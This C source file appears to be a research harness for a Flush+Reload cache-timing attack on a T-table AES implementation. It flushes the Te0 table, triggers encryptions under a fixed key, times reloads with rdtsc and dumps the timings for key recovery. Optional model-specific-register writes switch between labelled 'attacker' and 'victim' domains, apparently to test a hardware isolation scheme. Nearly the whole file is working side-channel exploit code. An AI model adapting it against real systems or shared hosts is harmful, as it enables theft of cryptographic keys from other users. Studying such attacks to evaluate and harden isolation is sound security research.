#include <stdio.h>
#include <stdlib.h>
#include "aes.h"
#include "aes_locl.h"
#include <time.h>
#include <inttypes.h>
#include <malloc.h>
#include <math.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */

#pragma optimize("gt",on)

#else
#include <x86intrin.h> /* for rdtscp and clflush */

#endif

#define KEY_LENGTH 16
#define BUF_SIZE 256
#define LEN 16
#define CACHELINE_SIZE 64
#define NUM_AES_TABLES 4
#define NUM_AES_LINES 1024*4/CACHELINE_SIZE
#define RELOAD_INDEX_MASK NUM_AES_LINES-1

#ifdef MSR_DOMAIN
#define ATTACKER_ID 0
#define VICTIM_ID 1
#endif
//#define MSR_DOMAIN 0xC0010118

/*
 * Get accurate cycle count from processor. for x86
 */
#define rdtscll(high, low) \
	do { \
		asm volatile("rdtsc\n" \
			     "movl %%edx, %0\n" \
			     "movl %%eax, %1\n" \
			     : "=r" (high), "=r" (low) \
			     :	 	\
			     : "%eax", "%edx");\
	} while (0)

char in[LEN];
char workarea[LEN];
char out[BUF_SIZE][NUM_AES_LINES*8+16];
AES_KEY expanded; 
FILE *infile;
//char* mem_start;

static inline void wrmsr(uint32_t msr_id, uint64_t msr_value)
{
    asm volatile ( "wrmsr" : : "c" (msr_id), "A" (msr_value) );
}

int main(int argc, char** argv)
{
    const unsigned char key_byte[KEY_LENGTH]={0x0f, 0x1e, 0xdb, 0x65, 0xe6, 0xd1, 0x03, 0x5e, 0xfa, 0x94, 0x1f, 0x0c, 0x4b, 0x41, 0xff, 0xbb};
    // const unsigned char key_byte[KEY_LENGTH]={0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    unsigned int n, i, j, k;
    FILE *outfile = 0;
    int len;
    int line, index;
    int trials = atoi(argv[2]);
    unsigned int cycles_begin_hi, cycles_begin_low;
    unsigned int cycles_end_hi, cycles_end_low;
    const u32 *aes_table = NULL;
    unsigned int temp;
    int cacheline_shift_bits =  (int) (log2(CACHELINE_SIZE/4));

    uint64_t msr_value;

#ifdef MSR_DOMAIN
    asm volatile ( "rdmsr" : "=A" (msr_value) : "c" (MSR_DOMAIN) );
    printf("MSR_DOMAIN: %llu, %#x, %d\n", msr_value, MSR_DOMAIN, ATTACKER_ID);
    //wrmsr(msr_domainid, attacker_id);
    asm volatile ( "wrmsr" : : "c" ((uint32_t) MSR_DOMAIN),
		   "a" ((uint32_t) ATTACKER_ID),
		   "d" ((uint32_t) 0) );
    //__writemsr(MSR_DOMAIN, ATTACKER_ID);
#endif
#ifdef MSR_EN
    asm volatile ( "wrmsr" : : "c" ((uint32_t) MSR_EN),
           "a" ((uint32_t) 0),
           "d" ((uint32_t) 0) );
#endif

    //printf("First key byte: %#x\n", key_byte[0]);
    for (int flushi = 0; flushi < KEY_LENGTH; flushi++)
        _mm_clflush((char *) &(key_byte[flushi]));

    infile = fopen("random_file_large", "r");
    if(infile == NULL){
        printf("\ncould not open file\n");
        return -1;
    }
    outfile = fopen(argv[1], "w");
    if(outfile == NULL){
        printf("\nCould not open file\n");
        return -1;
    }

    AES_set_encrypt_key(key_byte, 128, &expanded);
    // make key visible to other domain
    for (int flushi = 0; flushi < 4*(AES_MAXNR + 1); flushi++)
        _mm_clflush((char *) &(expanded.rd_key[flushi]));
    _mm_clflush((char *) &(expanded.rounds));
    for (int flushi = 0; flushi < 1024; flushi++) {
        _mm_clflush((char *) &(Te0[flushi]));
        _mm_clflush((char *) &(Te1[flushi]));
        _mm_clflush((char *) &(Te2[flushi]));
        _mm_clflush((char *) &(Te3[flushi]));
        _mm_clflush((char *) &(Te4[flushi]));
    }
 
    //for(j = 0; j < NUM_AES_TABLES; j++) {
    for(j = 0; j < 1; j++) {
	if (j == 0)
	    aes_table = Te0;
	else if (j == 1)
	    aes_table = Te1;
	else if (j == 2)
	    aes_table = Te2;
	else if (j == 3)
	    aes_table = Te3;
	else {
	    printf("Incorrect table number: %u\n", j);
	    exit(1);
	}

	printf("CACHELINE_SHIFT_BITS: %d\n", cacheline_shift_bits);
	//exit(0);
        for (k=0; k<trials; k++){
            if(k%1 == 0)
		printf("Attacking Table[%u] Round No.%u\n", j, k);
	    for (n=0; n<BUF_SIZE; n++){
		// make input visible to other domain
		len = fread(in, LEN, 1, infile);
		for (int flushi = 0; flushi < LEN; flushi++)
		    _mm_clflush((char *) in + flushi);

		// flush
		for (line=0; line < NUM_AES_LINES; line++){
		    _mm_clflush((char *) (aes_table) + line * CACHELINE_SIZE);
		}

#ifdef MSR_DOMAIN
		// Switch to victim's domain
		// wrmsr(msr_domainid, victim_id);
                //asm volatile ( "wrmsr" : : "c" (MSR_DOMAIN), "A" (VICTIM_ID) );
                asm volatile ( "wrmsr" : : "c" ((uint32_t) MSR_DOMAIN),
		   "a" ((uint32_t) VICTIM_ID),
		   "d" ((uint32_t) 0) );
#endif
#ifdef MSR_EN
        asm volatile ( "wrmsr" : : "c" ((uint32_t) MSR_EN),
           "a" ((uint32_t) 1),
           "d" ((uint32_t) 0) );
#endif

		AES_encrypt(in,workarea,&expanded);

#ifdef MSR_DOMAIN
		// Switch to attacker's domain
		// wrmsr(msr_domainid, attacker_id);
                //asm volatile ( "wrmsr" : : "c" (MSR_DOMAIN), "A" (ATTACKER_ID) );
                asm volatile ( "wrmsr" : : "c" ((uint32_t) MSR_DOMAIN),
		   "a" ((uint32_t) ATTACKER_ID),
		   "d" ((uint32_t) 0) );
#endif
#ifdef MSR_EN
        asm volatile ( "wrmsr" : : "c" ((uint32_t) MSR_EN),
           "a" ((uint32_t) 0),
           "d" ((uint32_t) 0) );
#endif

		// reload
		for (line = 0; line < NUM_AES_LINES; line++){
		    index = ((line * 167) + 13) & RELOAD_INDEX_MASK;
		    index = index << cacheline_shift_bits;
		    rdtscll(cycles_begin_hi, cycles_begin_low);
		    temp &= aes_table[index];
		    rdtscll(cycles_end_hi, cycles_end_low);
		    *(uint64_t *) (out[n] + 16 + ((index >> cacheline_shift_bits) << 3)) = cycles_end_low - cycles_begin_low;
		}
		for (i = 0;i < 16;++i) {
		    out[n][i] = in[i];
		}
	    }
	    fwrite(out, NUM_AES_LINES*8+16, BUF_SIZE, outfile);
	}
    }

    //printf("Print mem_start: ");
    //for (i = 0; i < NUMSET*L1_ASSOC; i++)
    //  printf("%#x", mem_start[i*L1_LINE_SIZE]);
    fclose(outfile);
    fclose(infile);
    return 0;
}

  
